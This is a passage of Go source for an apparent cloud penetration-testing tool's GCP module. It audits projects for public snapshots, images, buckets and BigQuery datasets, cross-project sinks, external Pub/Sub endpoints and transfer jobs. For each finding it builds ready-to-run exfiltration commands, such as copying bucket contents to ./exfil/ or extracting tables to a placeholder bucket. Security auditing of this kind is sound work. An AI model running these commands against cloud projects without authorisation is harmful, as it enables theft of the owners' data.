package commands

import (
	"context"
	"fmt"
	"strings"
	"sync"

	bigqueryservice "github.com/BishopFox/cloudfox/gcp/services/bigqueryService"
	loggingservice "github.com/BishopFox/cloudfox/gcp/services/loggingService"
	orgpolicyservice "github.com/BishopFox/cloudfox/gcp/services/orgpolicyService"
	pubsubservice "github.com/BishopFox/cloudfox/gcp/services/pubsubService"
	vpcscservice "github.com/BishopFox/cloudfox/gcp/services/vpcscService"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	"github.com/spf13/cobra"

	compute "google.golang.org/api/compute/v1"
	sqladmin "google.golang.org/api/sqladmin/v1"
	storage "google.golang.org/api/storage/v1"
	storagetransfer "google.golang.org/api/storagetransfer/v1"
)

// Module name constant
const GCP_DATAEXFILTRATION_MODULE_NAME string = "data-exfiltration"

var GCPDataExfiltrationCommand = &cobra.Command{
	Use:     GCP_DATAEXFILTRATION_MODULE_NAME,
	Aliases: []string{"exfil", "data-exfil", "exfiltration"},
	Short:   "Identify data exfiltration paths and high-risk data exposure",
	Long: `Identify REAL data exfiltration vectors and paths in GCP environments.

This module enumerates actual configurations, NOT generic assumptions.

Features:
- Public snapshots and images (actual IAM policy check)
- Public buckets (actual IAM policy check)
- Cross-project logging sinks (actual sink enumeration)
- Pub/Sub push subscriptions to external endpoints
- Pub/Sub subscriptions exporting to BigQuery/GCS
- BigQuery datasets with public IAM bindings
- Cloud SQL instances with export configurations
- Storage Transfer Service jobs to external destinations (AWS S3, Azure Blob)

Security Controls Checked:
- VPC Service Controls (VPC-SC) perimeter protection
- Organization policies: storage.publicAccessPrevention, iam.allowedPolicyMemberDomains, sql.restrictPublicIp

Each finding is based on actual resource configuration, not assumptions.`,
	Run: runGCPDataExfiltrationCommand,
}

// ------------------------------
// Data Structures
// ------------------------------

type ExfiltrationPath struct {
	PathType       string   // Category of exfiltration
	ResourceName   string   // Specific resource
	ProjectID      string   // Source project
	Description    string   // What the path enables
	Destination    string   // Where data can go
	RiskLevel      string   // CRITICAL, HIGH, MEDIUM, LOW
	RiskReasons    []string // Why this is risky
	ExploitCommand string   // Command to exploit
	VPCSCProtected bool     // Is this project protected by VPC-SC?
}

type PublicExport struct {
	ResourceType string
	ResourceName string
	ProjectID    string
	AccessLevel  string // "allUsers", "allAuthenticatedUsers"
	DataType     string
	Size         string
	RiskLevel    string
}

// OrgPolicyProtection tracks which org policies protect a project from data exfiltration
type OrgPolicyProtection struct {
	ProjectID                 string
	PublicAccessPrevention    bool   // storage.publicAccessPrevention enforced
	DomainRestriction         bool   // iam.allowedPolicyMemberDomains enforced
	SQLPublicIPRestriction    bool   // sql.restrictPublicIp enforced
	ResourceLocationRestriction bool // gcp.resourceLocations enforced
	MissingProtections        []string
}

// ------------------------------
// Module Struct
// ------------------------------
type DataExfiltrationModule struct {
	gcpinternal.BaseGCPModule

	ExfiltrationPaths  []ExfiltrationPath
	PublicExports      []PublicExport
	LootMap            map[string]*internal.LootFile
	mu                 sync.Mutex
	vpcscProtectedProj map[string]bool          // Projects protected by VPC-SC
	orgPolicyProtection map[string]*OrgPolicyProtection // Org policy protections per project
}

// ------------------------------
// Output Struct
// ------------------------------
type DataExfiltrationOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o DataExfiltrationOutput) TableFiles() []internal.TableFile { return o.Table }
func (o DataExfiltrationOutput) LootFiles() []internal.LootFile   { return o.Loot }

// ------------------------------
// Command Entry Point
// ------------------------------
func runGCPDataExfiltrationCommand(cmd *cobra.Command, args []string) {
	cmdCtx, err := gcpinternal.InitializeCommandContext(cmd, GCP_DATAEXFILTRATION_MODULE_NAME)
	if err != nil {
		return
	}

	module := &DataExfiltrationModule{
		BaseGCPModule:       gcpinternal.NewBaseGCPModule(cmdCtx),
		ExfiltrationPaths:   []ExfiltrationPath{},
		PublicExports:       []PublicExport{},
		LootMap:             make(map[string]*internal.LootFile),
		vpcscProtectedProj:  make(map[string]bool),
		orgPolicyProtection: make(map[string]*OrgPolicyProtection),
	}

	module.initializeLootFiles()
	module.Execute(cmdCtx.Ctx, cmdCtx.Logger)
}

// ------------------------------
// Module Execution
// ------------------------------
func (m *DataExfiltrationModule) Execute(ctx context.Context, logger internal.Logger) {
	logger.InfoM("Identifying data exfiltration paths...", GCP_DATAEXFILTRATION_MODULE_NAME)

	// First, check VPC-SC protection status for all projects
	m.checkVPCSCProtection(ctx, logger)

	// Check organization policy protections for all projects
	m.checkOrgPolicyProtection(ctx, logger)

	// Process each project
	m.RunProjectEnumeration(ctx, logger, m.ProjectIDs, GCP_DATAEXFILTRATION_MODULE_NAME, m.processProject)

	// Check results
	if len(m.ExfiltrationPaths) == 0 && len(m.PublicExports) == 0 {
		logger.InfoM("No data exfiltration paths found", GCP_DATAEXFILTRATION_MODULE_NAME)
		return
	}

	logger.SuccessM(fmt.Sprintf("Found %d exfiltration path(s) and %d public export(s)",
		len(m.ExfiltrationPaths), len(m.PublicExports)), GCP_DATAEXFILTRATION_MODULE_NAME)

	m.writeOutput(ctx, logger)
}

// ------------------------------
// VPC-SC Protection Check
// ------------------------------
func (m *DataExfiltrationModule) checkVPCSCProtection(ctx context.Context, logger internal.Logger) {
	// Try to get organization ID from projects
	// VPC-SC is organization-level
	vpcsc := vpcscservice.New()

	// Get org ID from first project (simplified - in reality would need proper org detection)
	if len(m.ProjectIDs) == 0 {
		return
	}

	// Try common org IDs or skip if we don't have org access
	// This is a best-effort check
	policies, err := vpcsc.ListAccessPolicies("")
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			logger.InfoM("Could not check VPC-SC policies (may require org-level access)", GCP_DATAEXFILTRATION_MODULE_NAME)
		}
		return
	}

	// For each policy, check perimeters
	for _, policy := range policies {
		perimeters, err := vpcsc.ListServicePerimeters(policy.Name)
		if err != nil {
			continue
		}

		// Mark projects in perimeters as protected
		for _, perimeter := range perimeters {
			for _, resource := range perimeter.Resources {
				// Resources are in format "projects/123456"
				projectNum := strings.TrimPrefix(resource, "projects/")
				m.mu.Lock()
				m.vpcscProtectedProj[projectNum] = true
				m.mu.Unlock()
			}
		}
	}
}

// ------------------------------
// Organization Policy Protection Check
// ------------------------------
func (m *DataExfiltrationModule) checkOrgPolicyProtection(ctx context.Context, logger internal.Logger) {
	orgSvc := orgpolicyservice.New()

	for _, projectID := range m.ProjectIDs {
		protection := &OrgPolicyProtection{
			ProjectID:          projectID,
			MissingProtections: []string{},
		}

		// Get all policies for this project
		policies, err := orgSvc.ListProjectPolicies(projectID)
		if err != nil {
			// Non-fatal - continue with other projects
			if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
				logger.InfoM(fmt.Sprintf("Could not check org policies for %s: %v", projectID, err), GCP_DATAEXFILTRATION_MODULE_NAME)
			}
			m.mu.Lock()
			m.orgPolicyProtection[projectID] = protection
			m.mu.Unlock()
			continue
		}

		// Check for specific protective policies
		for _, policy := range policies {
			switch policy.Constraint {
			case "constraints/storage.publicAccessPrevention":
				if policy.Enforced {
					protection.PublicAccessPrevention = true
				}
			case "constraints/iam.allowedPolicyMemberDomains":
				if policy.Enforced || len(policy.AllowedValues) > 0 {
					protection.DomainRestriction = true
				}
			case "constraints/sql.restrictPublicIp":
				if policy.Enforced {
					protection.SQLPublicIPRestriction = true
				}
			case "constraints/gcp.resourceLocations":
				if policy.Enforced || len(policy.AllowedValues) > 0 {
					protection.ResourceLocationRestriction = true
				}
			}
		}

		// Identify missing protections
		if !protection.PublicAccessPrevention {
			protection.MissingProtections = append(protection.MissingProtections, "storage.publicAccessPrevention not enforced")
		}
		if !protection.DomainRestriction {
			protection.MissingProtections = append(protection.MissingProtections, "iam.allowedPolicyMemberDomains not configured")
		}
		if !protection.SQLPublicIPRestriction {
			protection.MissingProtections = append(protection.MissingProtections, "sql.restrictPublicIp not enforced")
		}

		m.mu.Lock()
		m.orgPolicyProtection[projectID] = protection
		m.mu.Unlock()
	}
}

// isOrgPolicyProtected checks if a project has key org policy protections
func (m *DataExfiltrationModule) isOrgPolicyProtected(projectID string) bool {
	if protection, ok := m.orgPolicyProtection[projectID]; ok {
		// Consider protected if at least public access prevention is enabled
		return protection.PublicAccessPrevention
	}
	return false
}

// ------------------------------
// Project Processor
// ------------------------------
func (m *DataExfiltrationModule) processProject(ctx context.Context, projectID string, logger internal.Logger) {
	if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Analyzing exfiltration paths in project: %s", projectID), GCP_DATAEXFILTRATION_MODULE_NAME)
	}

	// 1. Find public/shared snapshots (REAL check)
	m.findPublicSnapshots(ctx, projectID, logger)

	// 2. Find public/shared images (REAL check)
	m.findPublicImages(ctx, projectID, logger)

	// 3. Find public buckets (REAL check)
	m.findPublicBuckets(ctx, projectID, logger)

	// 4. Find cross-project logging sinks (REAL enumeration)
	m.findCrossProjectLoggingSinks(ctx, projectID, logger)

	// 5. Find Pub/Sub push subscriptions to external endpoints (REAL check)
	m.findPubSubPushEndpoints(ctx, projectID, logger)

	// 6. Find Pub/Sub subscriptions exporting to external destinations
	m.findPubSubExportSubscriptions(ctx, projectID, logger)

	// 7. Find BigQuery datasets with public access (REAL check)
	m.findPublicBigQueryDatasets(ctx, projectID, logger)

	// 8. Find Cloud SQL with export enabled
	m.findCloudSQLExportConfig(ctx, projectID, logger)

	// 9. Find Storage Transfer jobs to external destinations
	m.findStorageTransferJobs(ctx, projectID, logger)
}

// findPublicSnapshots finds snapshots that are publicly accessible
func (m *DataExfiltrationModule) findPublicSnapshots(ctx context.Context, projectID string, logger internal.Logger) {
	computeService, err := compute.NewService(ctx)
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not create Compute service in project %s", projectID))
		return
	}

	req := computeService.Snapshots.List(projectID)
	err = req.Pages(ctx, func(page *compute.SnapshotList) error {
		for _, snapshot := range page.Items {
			// Get IAM policy for snapshot
			policy, err := computeService.Snapshots.GetIamPolicy(projectID, snapshot.Name).Do()
			if err != nil {
				continue
			}

			// Check for public access
			accessLevel := ""
			for _, binding := range policy.Bindings {
				for _, member := range binding.Members {
					if member == "allUsers" {
						accessLevel = "allUsers"
						break
					}
					if member == "allAuthenticatedUsers" && accessLevel != "allUsers" {
						accessLevel = "allAuthenticatedUsers"
					}
				}
			}

			if accessLevel != "" {
				export := PublicExport{
					ResourceType: "Disk Snapshot",
					ResourceName: snapshot.Name,
					ProjectID:    projectID,
					AccessLevel:  accessLevel,
					DataType:     "disk_snapshot",
					Size:         fmt.Sprintf("%d GB", snapshot.DiskSizeGb),
					RiskLevel:    "CRITICAL",
				}

				path := ExfiltrationPath{
					PathType:     "Public Snapshot",
					ResourceName: snapshot.Name,
					ProjectID:    projectID,
					Description:  fmt.Sprintf("Disk snapshot (%d GB) accessible to %s", snapshot.DiskSizeGb, accessLevel),
					Destination:  "Anyone with access level: " + accessLevel,
					RiskLevel:    "CRITICAL",
					RiskReasons:  []string{"Snapshot is publicly accessible", "May contain sensitive data from disk"},
					ExploitCommand: fmt.Sprintf(
						"# Create disk from public snapshot\n"+
							"gcloud compute disks create exfil-disk --source-snapshot=projects/%s/global/snapshots/%s --zone=us-central1-a",
						projectID, snapshot.Name),
				}

				m.mu.Lock()
				m.PublicExports = append(m.PublicExports, export)
				m.ExfiltrationPaths = append(m.ExfiltrationPaths, path)
				m.addExfiltrationPathToLoot(path)
				m.mu.Unlock()
			}
		}
		return nil
	})

	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list snapshots in project %s", projectID))
	}
}

// findPublicImages finds images that are publicly accessible
func (m *DataExfiltrationModule) findPublicImages(ctx context.Context, projectID string, logger internal.Logger) {
	computeService, err := compute.NewService(ctx)
	if err != nil {
		return
	}

	req := computeService.Images.List(projectID)
	err = req.Pages(ctx, func(page *compute.ImageList) error {
		for _, image := range page.Items {
			// Get IAM policy for image
			policy, err := computeService.Images.GetIamPolicy(projectID, image.Name).Do()
			if err != nil {
				continue
			}

			// Check for public access
			accessLevel := ""
			for _, binding := range policy.Bindings {
				for _, member := range binding.Members {
					if member == "allUsers" {
						accessLevel = "allUsers"
						break
					}
					if member == "allAuthenticatedUsers" && accessLevel != "allUsers" {
						accessLevel = "allAuthenticatedUsers"
					}
				}
			}

			if accessLevel != "" {
				export := PublicExport{
					ResourceType: "VM Image",
					ResourceName: image.Name,
					ProjectID:    projectID,
					AccessLevel:  accessLevel,
					DataType:     "vm_image",
					Size:         fmt.Sprintf("%d GB", image.DiskSizeGb),
					RiskLevel:    "CRITICAL",
				}

				path := ExfiltrationPath{
					PathType:     "Public Image",
					ResourceName: image.Name,
					ProjectID:    projectID,
					Description:  fmt.Sprintf("VM image (%d GB) accessible to %s", image.DiskSizeGb, accessLevel),
					Destination:  "Anyone with access level: " + accessLevel,
					RiskLevel:    "CRITICAL",
					RiskReasons:  []string{"VM image is publicly accessible", "May contain embedded credentials or sensitive data"},
					ExploitCommand: fmt.Sprintf(
						"# Create instance from public image\n"+
							"gcloud compute instances create exfil-vm --image=projects/%s/global/images/%s --zone=us-central1-a",
						projectID, image.Name),
				}

				m.mu.Lock()
				m.PublicExports = append(m.PublicExports, export)
				m.ExfiltrationPaths = append(m.ExfiltrationPaths, path)
				m.addExfiltrationPathToLoot(path)
				m.mu.Unlock()
			}
		}
		return nil
	})

	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list images in project %s", projectID))
	}
}

// findPublicBuckets finds GCS buckets with public access
func (m *DataExfiltrationModule) findPublicBuckets(ctx context.Context, projectID string, logger internal.Logger) {
	storageService, err := storage.NewService(ctx)
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not create Storage service in project %s", projectID))
		return
	}

	resp, err := storageService.Buckets.List(projectID).Do()
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list buckets in project %s", projectID))
		return
	}

	for _, bucket := range resp.Items {
		// Get IAM policy for bucket
		policy, err := storageService.Buckets.GetIamPolicy(bucket.Name).Do()
		if err != nil {
			continue
		}

		// Check for public access
		accessLevel := ""
		for _, binding := range policy.Bindings {
			for _, member := range binding.Members {
				if member == "allUsers" {
					accessLevel = "allUsers"
					break
				}
				if member == "allAuthenticatedUsers" && accessLevel != "allUsers" {
					accessLevel = "allAuthenticatedUsers"
				}
			}
		}

		if accessLevel != "" {
			export := PublicExport{
				ResourceType: "Storage Bucket",
				ResourceName: bucket.Name,
				ProjectID:    projectID,
				AccessLevel:  accessLevel,
				DataType:     "gcs_bucket",
				RiskLevel:    "CRITICAL",
			}

			path := ExfiltrationPath{
				PathType:     "Public Bucket",
				ResourceName: bucket.Name,
				ProjectID:    projectID,
				Description:  fmt.Sprintf("GCS bucket accessible to %s", accessLevel),
				Destination:  "Anyone with access level: " + accessLevel,
				RiskLevel:    "CRITICAL",
				RiskReasons:  []string{"Bucket is publicly accessible", "May contain sensitive files"},
				ExploitCommand: fmt.Sprintf(
					"# List public bucket contents\n"+
						"gsutil ls -r gs://%s/\n"+
						"# Download all files\n"+
						"gsutil -m cp -r gs://%s/ ./exfil/",
					bucket.Name, bucket.Name),
			}

			m.mu.Lock()
			m.PublicExports = append(m.PublicExports, export)
			m.ExfiltrationPaths = append(m.ExfiltrationPaths, path)
			m.addExfiltrationPathToLoot(path)
			m.mu.Unlock()
		}
	}
}

// findCrossProjectLoggingSinks finds REAL logging sinks that export to external destinations
func (m *DataExfiltrationModule) findCrossProjectLoggingSinks(ctx context.Context, projectID string, logger internal.Logger) {
	ls := loggingservice.New()
	sinks, err := ls.Sinks(projectID)
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list logging sinks in project %s", projectID))
		return
	}

	for _, sink := range sinks {
		if sink.Disabled {
			continue
		}

		// Only report cross-project or external sinks
		if sink.IsCrossProject {
			riskLevel := "HIGH"
			if sink.DestinationType == "pubsub" {
				riskLevel = "MEDIUM" // Pub/Sub is often used for legitimate cross-project messaging
			}

			destDesc := fmt.Sprintf("%s in project %s", sink.DestinationType, sink.DestinationProject)

			path := ExfiltrationPath{
				PathType:     "Logging Sink",
				ResourceName: sink.Name,
				ProjectID:    projectID,
				Description:  fmt.Sprintf("Logs exported to %s", destDesc),
				Destination:  sink.Destination,
				RiskLevel:    riskLevel,
				RiskReasons:  []string{"Logs exported to different project", "May contain sensitive information in log entries"},
				ExploitCommand: fmt.Sprintf(
					"# View sink configuration\n"+
						"gcloud logging sinks describe %s --project=%s\n"+
						"# Check destination permissions\n"+
						"# Destination: %s",
					sink.Name, projectID, sink.Destination),
			}

			m.mu.Lock()
			m.ExfiltrationPaths = append(m.ExfiltrationPaths, path)
			m.addExfiltrationPathToLoot(path)
			m.mu.Unlock()
		}
	}
}

// findPubSubPushEndpoints finds Pub/Sub subscriptions pushing to external HTTP endpoints
func (m *DataExfiltrationModule) findPubSubPushEndpoints(ctx context.Context, projectID string, logger internal.Logger) {
	ps := pubsubservice.New()
	subs, err := ps.Subscriptions(projectID)
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list Pub/Sub subscriptions in project %s", projectID))
		return
	}

	for _, sub := range subs {
		if sub.PushEndpoint == "" {
			continue
		}

		// Check if endpoint is external (not run.app, cloudfunctions.net, or same project)
		endpoint := sub.PushEndpoint
		isExternal := true
		if strings.Contains(endpoint, ".run.app") ||
			strings.Contains(endpoint, ".cloudfunctions.net") ||
			strings.Contains(endpoint, "appspot.com") ||
			strings.Contains(endpoint, "googleapis.com") {
			isExternal = false
		}

		if isExternal {
			riskLevel := "HIGH"

			path := ExfiltrationPath{
				PathType:     "Pub/Sub Push",
				ResourceName: sub.Name,
				ProjectID:    projectID,
				Description:  fmt.Sprintf("Subscription pushes messages to external endpoint"),
				Destination:  endpoint,
				RiskLevel:    riskLevel,
				RiskReasons:  []string{"Messages pushed to external HTTP endpoint", "Endpoint may be attacker-controlled"},
				ExploitCommand: fmt.Sprintf(
					"# View subscription configuration\n"+
						"gcloud pubsub subscriptions describe %s --project=%s\n"+
						"# Test endpoint\n"+
						"curl -v %s",
					sub.Name, projectID, endpoint),
			}

			m.mu.Lock()
			m.ExfiltrationPaths = append(m.ExfiltrationPaths, path)
			m.addExfiltrationPathToLoot(path)
			m.mu.Unlock()
		}
	}
}

// findPubSubExportSubscriptions finds Pub/Sub subscriptions exporting to BigQuery or GCS
func (m *DataExfiltrationModule) findPubSubExportSubscriptions(ctx context.Context, projectID string, logger internal.Logger) {
	ps := pubsubservice.New()
	subs, err := ps.Subscriptions(projectID)
	if err != nil {
		return
	}

	for _, sub := range subs {
		// Check for BigQuery export
		if sub.BigQueryTable != "" {
			// Extract project from table reference
			parts := strings.Split(sub.BigQueryTable, ".")
			if len(parts) >= 1 {
				destProject := parts[0]
				if destProject != projectID {
					path := ExfiltrationPath{
						PathType:     "Pub/Sub BigQuery Export",
						ResourceName: sub.Name,
						ProjectID:    projectID,
						Description:  "Subscription exports messages to BigQuery in different project",
						Destination:  sub.BigQueryTable,
						RiskLevel:    "MEDIUM",
						RiskReasons:  []string{"Messages exported to different project", "Data flows outside source project"},
						ExploitCommand: fmt.Sprintf(
							"gcloud pubsub subscriptions describe %s --project=%s",
							sub.Name, projectID),
					}

					m.mu.Lock()
					m.ExfiltrationPaths = append(m.ExfiltrationPaths, path)
					m.addExfiltrationPathToLoot(path)
					m.mu.Unlock()
				}
			}
		}

		// Check for Cloud Storage export
		if sub.CloudStorageBucket != "" {
			path := ExfiltrationPath{
				PathType:     "Pub/Sub GCS Export",
				ResourceName: sub.Name,
				ProjectID:    projectID,
				Description:  "Subscription exports messages to Cloud Storage bucket",
				Destination:  "gs://" + sub.CloudStorageBucket,
				RiskLevel:    "MEDIUM",
				RiskReasons:  []string{"Messages exported to Cloud Storage", "Bucket may be accessible externally"},
				ExploitCommand: fmt.Sprintf(
					"gcloud pubsub subscriptions describe %s --project=%s\n"+
						"gsutil ls gs://%s/",
					sub.Name, projectID, sub.CloudStorageBucket),
			}

			m.mu.Lock()
			m.ExfiltrationPaths = append(m.ExfiltrationPaths, path)
			m.addExfiltrationPathToLoot(path)
			m.mu.Unlock()
		}
	}
}

// findPublicBigQueryDatasets finds BigQuery datasets with public IAM bindings
func (m *DataExfiltrationModule) findPublicBigQueryDatasets(ctx context.Context, projectID string, logger internal.Logger) {
	bq := bigqueryservice.New()
	datasets, err := bq.BigqueryDatasets(projectID)
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list BigQuery datasets in project %s", projectID))
		return
	}

	for _, dataset := range datasets {
		// Check if dataset has public access (already computed by the service)
		if dataset.IsPublic {
			export := PublicExport{
				ResourceType: "BigQuery Dataset",
				ResourceName: dataset.DatasetID,
				ProjectID:    projectID,
				AccessLevel:  dataset.PublicAccess,
				DataType:     "bigquery_dataset",
				RiskLevel:    "CRITICAL",
			}

			path := ExfiltrationPath{
				PathType:     "Public BigQuery",
				ResourceName: dataset.DatasetID,
				ProjectID:    projectID,
				Description:  fmt.Sprintf("BigQuery dataset accessible to %s", dataset.PublicAccess),
				Destination:  "Anyone with access level: " + dataset.PublicAccess,
				RiskLevel:    "CRITICAL",
				RiskReasons:  []string{"Dataset is publicly accessible", "Data can be queried by anyone"},
				ExploitCommand: fmt.Sprintf(
					"# Query public dataset\n"+
						"bq query --use_legacy_sql=false 'SELECT * FROM `%s.%s.INFORMATION_SCHEMA.TABLES`'\n"+
						"# Export data\n"+
						"bq extract --destination_format=CSV '%s.%s.TABLE_NAME' gs://your-bucket/export.csv",
					projectID, dataset.DatasetID, projectID, dataset.DatasetID),
			}

			m.mu.Lock()
			m.PublicExports = append(m.PublicExports, export)
			m.ExfiltrationPaths = append(m.ExfiltrationPaths, path)
			m.addExfiltrationPathToLoot(path)
			m.mu.Unlock()
		}
	}
}

// findCloudSQLExportConfig finds Cloud SQL instances with export configurations
func (m *DataExfiltrationModule) findCloudSQLExportConfig(ctx context.Context, projectID string, logger internal.Logger) {
	sqlService, err := sqladmin.NewService(ctx)
	if err != nil {
		return
	}

	resp, err := sqlService.Instances.List(projectID).Do()
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list Cloud SQL instances in project %s", projectID))
		return
	}

	for _, instance := range resp.Items {
		// Check if instance has automated backups enabled with export to GCS
		if instance.Settings != nil && instance.Settings.BackupConfiguration != nil {
			backup := instance.Settings.BackupConfiguration
			if backup.Enabled && backup.BinaryLogEnabled {
				// Instance has binary logging - can export via CDC
				path := ExfiltrationPath{
					PathType:     "Cloud SQL Export",
					ResourceName: instance.Name,
					ProjectID:    projectID,
					Description:  "Cloud SQL instance with binary logging enabled (enables CDC export)",
					Destination:  "External via mysqldump/pg_dump or CDC",
					RiskLevel:    "LOW", // This is standard config, not necessarily a risk
					RiskReasons:  []string{"Binary logging enables change data capture", "Data can be exported if IAM allows"},
					ExploitCommand: fmt.Sprintf(
						"# Check export permissions\n"+
							"gcloud sql instances describe %s --project=%s\n"+
							"# Export if permitted\n"+
							"gcloud sql export sql %s gs://bucket/export.sql --database=mydb",
						instance.Name, projectID, instance.Name),
				}

				m.mu.Lock()
				m.ExfiltrationPaths = append(m.ExfiltrationPaths, path)
				m.addExfiltrationPathToLoot(path)
				m.mu.Unlock()
			}
		}
	}
}

// findStorageTransferJobs finds Storage Transfer Service jobs to external destinations
func (m *DataExfiltrationModule) findStorageTransferJobs(ctx context.Context, projectID string, logger internal.Logger) {
	stsService, err := storagetransfer.NewService(ctx)
	if err != nil {
		return
	}

	// List transfer jobs for this project - filter is a required parameter
	filter := fmt.Sprintf(`{"projectId":"%s"}`, projectID)
	req := stsService.TransferJobs.List(filter)
	err = req.Pages(ctx, func(page *storagetransfer.ListTransferJobsResponse) error {
		for _, job := range page.TransferJobs {
			if job.Status != "ENABLED" {
				continue
			}

			// Check for external destinations (AWS S3, Azure Blob, HTTP)
			var destination string
			var destType string
			var isExternal bool

			if job.TransferSpec != nil {
				if job.TransferSpec.AwsS3DataSource != nil {
					destination = fmt.Sprintf("s3://%s", job.TransferSpec.AwsS3DataSource.BucketName)
					destType = "AWS S3"
					isExternal = true
				}
				if job.TransferSpec.AzureBlobStorageDataSource != nil {
					destination = fmt.Sprintf("azure://%s/%s",
						job.TransferSpec.AzureBlobStorageDataSource.StorageAccount,
						job.TransferSpec.AzureBlobStorageDataSource.Container)
					destType = "Azure Blob"
					isExternal = true
				}
				if job.TransferSpec.HttpDataSource != nil {
					destination = job.TransferSpec.HttpDataSource.ListUrl
					destType = "HTTP"
					isExternal = true
				}
			}

			if isExternal {
				path := ExfiltrationPath{
					PathType:     "Storage Transfer",
					ResourceName: job.Name,
					ProjectID:    projectID,
					Description:  fmt.Sprintf("Transfer job to %s", destType),
					Destination:  destination,
					RiskLevel:    "HIGH",
					RiskReasons:  []string{"Data transferred to external cloud provider", "Destination outside GCP control"},
					ExploitCommand: fmt.Sprintf(
						"# View transfer job\n"+
							"gcloud transfer jobs describe %s",
						job.Name),
				}

				m.mu.Lock()
				m.ExfiltrationPaths = append(m.ExfiltrationPaths, path)
				m.addExfiltrationPathToLoot(path)
				m.mu.Unlock()
			}
		}
		return nil
	})

	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list Storage Transfer jobs for project %s", projectID))
	}
}

// ------------------------------
// Loot File Management
// ------------------------------
func (m *DataExfiltrationModule) initializeLootFiles() {
	m.LootMap["data-exfiltration-commands"] = &internal.LootFile{
		Name:     "data-exfiltration-commands",
		Contents: "# Data Exfiltration Commands\n# Generated by CloudFox\n# WARNING: Only use with proper authorization!\n\n",
	}
}

// formatExfilType converts internal type names to user-friendly display names
func formatExfilType(pathType string) string {
	return pathType // Already formatted in the new module
}

func (m *DataExfiltrationModule) addExfiltrationPathToLoot(path ExfiltrationPath) {
	if path.ExploitCommand == "" {
		return
	}

	m.LootMap["data-exfiltration-commands"].Contents += fmt.Sprintf(
		"## %s: %s (Project: %s)\n"+
			"# %s\n"+
			"# Destination: %s\n",
		path.PathType,
		path.ResourceName,
		path.ProjectID,
		path.Description,
		path.Destination,
	)

	m.LootMap["data-exfiltration-commands"].Contents += fmt.Sprintf("%s\n\n", path.ExploitCommand)
}

// ------------------------------
// Output Generation
// ------------------------------

// getExfilDescription returns a user-friendly description of the exfiltration path type
func getExfilDescription(pathType string) string {
	descriptions := map[string]string{
		"Public Snapshot":         "Disk snapshot can be copied to create new disks externally",
		"Public Image":            "VM image can be used to launch instances externally",
		"Public Bucket":           "GCS bucket contents can be downloaded by anyone",
		"Logging Sink":            "Logs can be exported to a cross-project destination",
		"Pub/Sub Push":            "Messages can be pushed to an external HTTP endpoint",
		"Pub/Sub BigQuery Export": "Messages can be exported to BigQuery in another project",
		"Pub/Sub GCS Export":      "Messages can be exported to a Cloud Storage bucket",
		"Public BigQuery":         "BigQuery dataset can be queried and exported by anyone",
		"Cloud SQL Export":        "Cloud SQL data can be exported via CDC or backup",
		"Storage Transfer":        "Data can be transferred to external cloud providers",
	}

	if desc, ok := descriptions[pathType]; ok {
		return desc
	}
	return "Data can be exfiltrated via this path"
}

func (m *DataExfiltrationModule) writeOutput(ctx context.Context, logger internal.Logger) {
	header := []string{
		"Project ID",
		"Project Name",
		"Resource",
		"Type",
		"Destination",
		"Public",
		"VPC-SC Protected",
		"Org Policy Protected",
		"Description",
	}

	var body [][]string

	// Track which resources we've added from PublicExports
	publicResources := make(map[string]PublicExport)
	for _, e := range m.PublicExports {
		key := fmt.Sprintf("%s:%s:%s", e.ProjectID, e.ResourceType, e.ResourceName)
		publicResources[key] = e
	}

	// Add exfiltration paths
	for _, p := range m.ExfiltrationPaths {
		key := fmt.Sprintf("%s:%s:%s", p.ProjectID, p.PathType, p.ResourceName)
		_, isPublic := publicResources[key]

		publicStatus := "No"
		if isPublic {
			publicStatus = "Yes"
			delete(publicResources, key)
		}

		// Check VPC-SC protection
		vpcscProtected := "No"
		if m.vpcscProtectedProj[p.ProjectID] || p.VPCSCProtected {
			vpcscProtected = "Yes"
		}

		// Check org policy protection
		orgPolicyProtected := "No"
		if m.isOrgPolicyProtected(p.ProjectID) {
			orgPolicyProtected = "Yes"
		}

		body = append(body, []string{
			p.ProjectID,
			m.GetProjectName(p.ProjectID),
			p.ResourceName,
			p.PathType,
			p.Destination,
			publicStatus,
			vpcscProtected,
			orgPolicyProtected,
			getExfilDescription(p.PathType),
		})
	}

	// Add any remaining public exports not already covered
	for _, e := range publicResources {
		// Check VPC-SC protection
		vpcscProtected := "No"
		if m.vpcscProtectedProj[e.ProjectID] {
			vpcscProtected = "Yes"
		}

		// Check org policy protection
		orgPolicyProtected := "No"
		if m.isOrgPolicyProtected(e.ProjectID) {
			orgPolicyProtected = "Yes"
		}

		body = append(body, []string{
			e.ProjectID,
			m.GetProjectName(e.ProjectID),
			e.ResourceName,
			e.ResourceType,
			"Public access",
			"Yes",
			vpcscProtected,
			orgPolicyProtected,
			getExfilDescription(e.ResourceType),
		})
	}

